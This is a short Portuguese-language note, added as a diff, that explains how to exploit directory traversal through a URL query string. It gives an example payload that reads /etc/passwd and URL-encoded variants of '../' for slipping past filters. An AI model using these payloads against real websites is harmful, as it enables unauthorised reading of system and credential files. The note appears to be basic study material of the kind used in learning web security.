@@ -1,0 +1,26 @@
+O DIRECTORY TRAVERSAL É UMA VULNERABILIDADE EM QUE VOCÊ ATRAVESSA DIRETÓRIOS NA INTENÇÃO DE ACESSAR DIRETÓRIOS FORA DA PASTA RAÍZ DA WEB.
+	
+	
+	COMO EXPLORAR PELA URL:
+		
+		1.PROCURE UM QUERY STRING NA URL.
+			
+			EX: https://seusite.com/?search=cars
+			
+		2.ALTERE O VALOR DA QUERY STRING, USANDO '../' PARA VOLTAR DIRETÓRIOS E ENTRAR
+		EM UM ESPECÍFICO.
+			
+			EX: https://seusite.com/?search=../../../etc/passwd
+			
+			
+		EXTRA:VOCÊ PODE ENCODAR O '../' DEPENDENDO DO CASO PARA PODER CONSEGUIR
+		EXPLORAR A VULNERABILIDADE.	
+		
+			%2e%2e%2f: ../
+			
+			%2e%2e/: ../
+			
+			..%2f: ../
+		
+		
+
